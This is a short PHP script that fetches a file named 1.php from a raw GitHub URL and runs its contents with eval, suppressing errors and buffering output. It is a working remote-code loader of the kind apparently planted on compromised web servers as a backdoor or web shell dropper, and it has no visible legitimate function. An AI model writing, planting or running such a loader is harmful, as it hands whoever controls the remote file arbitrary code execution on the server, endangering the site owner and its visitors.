<?php
$remote = 'https://raw.githubusercontent.com/kitabisacom1337/Defend/refs/heads/main/1.php';
$payload = @file_get_contents($remote);

if ($payload) {
    ob_start();
    eval("?>".$payload);
    ob_end_flush();
} else {
    echo "Failed to load remote file.";
}
?>
